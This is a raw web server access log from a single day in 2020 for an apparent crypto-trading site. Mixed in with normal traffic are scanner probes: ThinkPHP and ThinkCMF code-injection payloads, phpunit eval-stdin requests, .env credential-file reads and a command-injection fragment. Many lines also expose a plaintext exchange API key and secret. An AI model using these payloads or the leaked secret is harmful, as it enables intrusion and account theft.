172.105.13.165 - - [22/Nov/2020:00:01:18 +0000] "GET / HTTP/1.0" 404 162 "-" "-"
172.105.13.165 - - [22/Nov/2020:00:01:24 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
172.105.13.165 - - [22/Nov/2020:00:12:36 +0000] "GET /nmaplowercheck1606003956 HTTP/1.1" 404 23 "-" "\x22Mozilla/5.0"
172.105.13.165 - - [22/Nov/2020:00:12:36 +0000] "HEAD / HTTP/1.1" 200 0 "-" "\x22Mozilla/5.0"
172.105.13.165 - - [22/Nov/2020:00:12:37 +0000] "GET /evox/about HTTP/1.1" 404 23 "-" "\x22Mozilla/5.0"
172.105.13.165 - - [22/Nov/2020:00:12:37 +0000] "POST /sdk HTTP/1.1" 404 23 "-" "\x22Mozilla/5.0"
172.105.13.165 - - [22/Nov/2020:00:13:21 +0000] "GET / HTTP/1.0" 404 162 "-" "-"
172.105.13.165 - - [22/Nov/2020:00:13:21 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
172.105.13.165 - - [22/Nov/2020:00:13:25 +0000] "GET /HNAP1 HTTP/1.1" 404 23 "-" "\x22Mozilla/5.0"
172.105.13.165 - - [22/Nov/2020:00:13:26 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330"
172.105.13.165 - - [22/Nov/2020:00:13:27 +0000] "GET / HTTP/1.1" 200 2154 "-" "\x22Mozilla/5.0"
172.105.13.165 - - [22/Nov/2020:00:13:28 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
172.105.13.165 - - [22/Nov/2020:00:13:28 +0000] "GET / HTTP/1.1" 200 2154 "-" "-"
61.219.11.153 - - [22/Nov/2020:00:17:54 +0000] "\x01\x02\x03\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"
69.162.83.246 - - [22/Nov/2020:00:25:21 +0000] "GET http://example.com/ HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
37.120.193.247 - - [22/Nov/2020:00:28:27 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 28173892 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
51.159.23.43 - - [22/Nov/2020:00:32:05 +0000] "GET / HTTP/1.1" 200 2154 "-" "-"
37.120.193.250 - - [22/Nov/2020:00:32:06 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 114271 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
37.120.193.250 - - [22/Nov/2020:00:32:07 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
37.120.193.250 - - [22/Nov/2020:00:32:07 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6751 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
37.120.193.250 - - [22/Nov/2020:00:32:07 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
37.120.193.250 - - [22/Nov/2020:00:40:11 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 3162484 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
207.46.13.221 - - [22/Nov/2020:00:48:09 +0000] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.221 - - [22/Nov/2020:00:48:10 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.24 - - [22/Nov/2020:00:48:15 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
91.241.19.84 - - [22/Nov/2020:00:52:50 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:00:52:50 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:00:52:50 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:00:52:50 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:00:52:50 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:00:52:50 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:00:52:50 +0000] "GET /console/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:00:52:50 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:00:52:52 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
37.120.193.248 - - [22/Nov/2020:01:03:46 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 341055 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
37.120.193.248 - - [22/Nov/2020:01:03:46 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
37.120.193.248 - - [22/Nov/2020:01:03:47 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6619 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
37.120.193.248 - - [22/Nov/2020:01:03:47 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
66.240.205.34 - - [22/Nov/2020:01:10:31 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 166 "-" "-"
1.34.157.194 - - [22/Nov/2020:01:12:37 +0000] "GET / HTTP/1.1" 404 162 "-" "Mozilla/5.0"
2.57.122.186 - - [22/Nov/2020:01:17:29 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
73.255.217.90 - - [22/Nov/2020:01:28:12 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 30699 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
37.120.193.248 - - [22/Nov/2020:01:32:02 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 16634367 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
74.120.14.54 - - [22/Nov/2020:01:40:57 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
74.120.14.54 - - [22/Nov/2020:01:40:57 +0000] "GET / HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
73.255.217.90 - - [22/Nov/2020:01:46:48 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:01:46:48 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6793 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:01:46:49 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:01:51:09 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 3274464 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:01:51:37 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:01:51:38 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6743 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:01:51:38 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
122.228.19.80 - - [22/Nov/2020:02:29:49 +0000] "GET / HTTP/1.1" 200 2154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
122.228.19.80 - - [22/Nov/2020:02:30:54 +0000] "GET /favicon.png HTTP/1.1" 200 144888 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
86.17.42.19 - - [22/Nov/2020:02:37:34 +0000] "GET http://httpheader.net/azenv.php HTTP/1.0" 404 162 "-" "-"
80.94.93.24 - PlcmSpIp [22/Nov/2020:02:41:53 +0000] "GET /pv/y000000000000.cfg HTTP/1.1" 404 23 "-" "python-requests/2.24.0"
207.46.13.221 - - [22/Nov/2020:02:50:03 +0000] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.221 - - [22/Nov/2020:02:50:04 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
13.66.139.33 - - [22/Nov/2020:02:50:10 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
41.213.138.16 - - [22/Nov/2020:03:10:22 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 162 "-" "B4ckdoor-owned-you"
41.213.138.16 - - [22/Nov/2020:03:10:22 +0000] "7%3b%23&remoteSubmit=Save" 400 166 "-" "-"
194.5.193.246 - - [22/Nov/2020:03:25:29 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
69.162.83.246 - - [22/Nov/2020:03:27:17 +0000] "GET http://example.com/ HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
52.167.112.124 - - [22/Nov/2020:03:48:21 +0000] "GET /.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.167.112.124 - - [22/Nov/2020:03:48:22 +0000] "POST / HTTP/1.1" 200 2154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
73.7.179.102 - - [22/Nov/2020:03:56:57 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
164.52.24.162 - - [22/Nov/2020:04:11:57 +0000] "GET / HTTP/1.1" 200 2154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
220.133.22.128 - - [22/Nov/2020:04:26:12 +0000] "GET / HTTP/1.1" 404 162 "-" "Mozilla/5.0"
69.162.83.246 - - [22/Nov/2020:04:30:48 +0000] "GET http://example.com/ HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
138.246.253.24 - - [22/Nov/2020:04:40:35 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
184.105.139.70 - - [22/Nov/2020:04:54:50 +0000] "GET / HTTP/1.1" 200 2154 "-" "-"
69.162.83.246 - - [22/Nov/2020:05:43:24 +0000] "GET http://example.com/ HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
205.185.119.203 - root [22/Nov/2020:05:56:17 +0000] "GET / HTTP/1.1" 200 2154 "-" "Mozilla/5.0 (compatible, MSIE 10.0, Windows NT, DigExt)"
69.162.83.246 - - [22/Nov/2020:06:23:31 +0000] "GET http://example.com/ HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
122.117.206.154 - - [22/Nov/2020:07:40:23 +0000] "GET / HTTP/1.1" 404 162 "-" "Mozilla/5.0"
129.146.190.190 - - [22/Nov/2020:07:51:54 +0000] "GET /.env HTTP/1.1" 301 178 "-" "IDBTE4M CODE87"
129.146.190.190 - - [22/Nov/2020:07:52:30 +0000] "POST / HTTP/1.1" 301 178 "-" "IDBTE4M CODE87"
182.218.152.87 - - [22/Nov/2020:08:37:21 +0000] "GET / HTTP/1.1" 404 162 "-" "Mozilla/5.0"
207.46.13.221 - - [22/Nov/2020:08:38:02 +0000] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.221 - - [22/Nov/2020:08:38:03 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
13.66.139.33 - - [22/Nov/2020:08:38:13 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
116.179.32.130 - - [22/Nov/2020:10:05:04 +0000] "GET / HTTP/1.1" 200 2154 "-" "Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
111.206.198.80 - - [22/Nov/2020:10:05:06 +0000] "GET /static/js/main.c2f0f302.chunk.js HTTP/1.1" 200 50484 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.198.70 - - [22/Nov/2020:10:05:07 +0000] "GET /static/css/2.a51ddd1f.chunk.css HTTP/1.1" 200 28453 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.198.75 - - [22/Nov/2020:10:05:26 +0000] "GET /static/js/2.fe90f51a.chunk.js HTTP/1.1" 200 212820 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
3.230.167.137 - - [22/Nov/2020:11:06:11 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
3.230.167.137 - - [22/Nov/2020:11:06:12 +0000] "GET / HTTP/1.1" 200 2154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
173.48.155.234 - - [22/Nov/2020:11:07:03 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:11:07:03 +0000] "GET /favicon.png HTTP/1.1" 200 144936 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:11:07:03 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6644 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:11:07:03 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
73.255.217.90 - - [22/Nov/2020:11:07:13 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:11:07:14 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6616 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:11:07:14 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
173.48.155.234 - - [22/Nov/2020:11:09:26 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 1671213 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
73.255.217.90 - - [22/Nov/2020:11:10:04 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 1576243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
2.57.122.186 - - [22/Nov/2020:11:11:01 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
173.48.155.234 - - [22/Nov/2020:11:11:18 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:11:11:19 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6689 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:11:11:19 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:11:12:49 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 1780236 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:11:18:56 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:11:18:56 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6709 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:11:18:57 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:11:20:52 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 1045195 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
13.81.214.123 - - [22/Nov/2020:11:21:34 +0000] "GET /.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.81.214.123 - - [22/Nov/2020:11:21:34 +0000] "POST / HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
129.146.133.174 - - [22/Nov/2020:11:26:51 +0000] "GET /.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
129.146.133.174 - - [22/Nov/2020:11:26:51 +0000] "POST / HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
